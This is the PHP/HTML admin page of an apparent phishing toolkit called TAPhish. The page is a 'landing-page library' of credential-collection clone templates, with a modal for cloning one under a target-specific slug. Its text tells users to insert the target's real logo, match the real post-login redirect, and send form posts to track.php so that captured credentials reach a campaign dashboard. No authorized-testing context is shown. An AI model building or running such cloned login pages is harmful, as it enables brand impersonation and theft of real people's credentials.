<?php
   require_once(dirname(__FILE__) . '/manager/session_manager.php');
   isSessionValid(true);
?>
<!DOCTYPE html>
<html dir="ltr" lang="en">
   <head>
      <meta charset="utf-8">
      <meta http-equiv="X-UA-Compatible" content="IE=edge">
      <meta name="viewport" content="width=device-width, initial-scale=1">
      <link rel="icon" type="image/png" sizes="16x16" href="images/brand/favicon.png">
      <title>TAPhish — Landing-page library</title>
      <link rel="stylesheet" type="text/css" href="css/style.min.css">
      <link rel="stylesheet" type="text/css" href="css/brand.css">
      <link rel="stylesheet" type="text/css" href="css/toastr.min.css">
   </head>
   <body class="dim-panel">
      <div class="preloader">
         <div class="lds-ripple"><div class="lds-pos"></div><div class="lds-pos"></div></div>
      </div>
      <div id="main-wrapper">
         <?php include_once 'z_menu.php' ?>
         <div class="page-wrapper">
            <div class="page-breadcrumb">
               <div class="row">
                  <div class="col-12 d-flex no-block align-items-center">
                     <h4 class="page-title">Landing-page library</h4>
                  </div>
               </div>
            </div>
            <div class="container-fluid">
               <div class="card mb-3">
                  <div class="card-body">
                     <h5 class="card-title">Hand-curated clone templates</h5>
                     <p class="card-text small text-muted mb-2">
                        Structural templates covering the three common credential-collection patterns
                        (multi-step, single-page + OTP, redirect-then-form). Templates ship with
                        <strong>placeholder branding</strong> — pick one, clone it to your sites with a
                        target-specific slug, then drop in the target's real logo and adjust the copy.
                        Form submissions wire through <code>track.php</code> so captures land in your
                        existing campaign dashboard.
                     </p>
                     <div class="alert alert-info small mb-0">
                        Each clone here is a starting point. For pixel-perfect production use, replace
                        the placeholder logo/header text + verify the redirect destination in the script
                        block matches your target's real post-login URL.
                     </div>
                  </div>
               </div>
               <div id="lib_grid" class="row"></div>
            </div>
            <?php include_once 'z_footer.php' ?>
         </div>
      </div>

      <!-- Clone-to-my-sites modal -->
      <div class="modal fade" id="modal_clone" tabindex="-1" role="dialog">
         <div class="modal-dialog" role="document">
            <div class="modal-content">
               <div class="modal-header">
                  <h5 class="modal-title">Clone <span id="modal_template_name">—</span> to my sites</h5>
                  <button type="button" class="close" data-dismiss="modal"><span>&times;</span></button>
               </div>
               <div class="modal-body">
                  <div class="form-group">
                     <label>Destination slug (a–z, 0–9, dashes)</label>
                     <input type="text" id="dest_slug" class="form-control" placeholder="acme-vpn-q3" maxlength="61">
                     <small class="form-text text-muted">The clone will live at <code>spear/sniperhost/cloned/&lt;slug&gt;/</code>.</small>
                  </div>
                  <div class="form-group">
                     <label>Tracker script URL (optional)</label>
                     <input type="text" id="tracker_url" class="form-control" placeholder="https://your-host/spear/track.js?rid=abc">
                     <small class="form-text text-muted">Leave blank to skip the tracker script. Form POSTs still land in <code>track.php</code>.</small>
                  </div>
                  <div class="form-group">
                     <label>POST URL override (optional)</label>
                     <input type="text" id="post_url" class="form-control" placeholder="https://your-host/track.php">
                     <small class="form-text text-muted">Leave blank to auto-detect from this server's URL.</small>
                  </div>
                  <div class="custom-control custom-checkbox">
                     <input type="checkbox" class="custom-control-input" id="cb_force">
                     <label class="custom-control-label" for="cb_force">Overwrite if slug already exists</label>
                  </div>
                  <input type="hidden" id="source_slug">
                  <div id="clone_result" class="mt-3"></div>
               </div>
               <div class="modal-footer">
                  <button type="button" class="btn btn-light" data-dismiss="modal">Cancel</button>
                  <button type="button" class="btn btn-info" id="btn_do_clone">
                     <i class="fa fa-clone"></i> Clone to my sites
                  </button>
               </div>
            </div>
         </div>
      </div>

      <script src="js/libs/jquery/jquery-3.6.0.min.js"></script>
      <script src="js/libs/js.cookie.min.js"></script>
      <script src="js/libs/bootstrap.min.js"></script>
      <script src="js/libs/perfect-scrollbar.jquery.min.js"></script>
      <script src="js/libs/custom.min.js"></script>
      <script src="js/common_scripts.js"></script>
      <script src="js/landing_library.js"></script>
      <script defer src="js/libs/sidebarmenu.js"></script>
      <script defer src="js/libs/toastr.min.js"></script>
   </body>
</html>
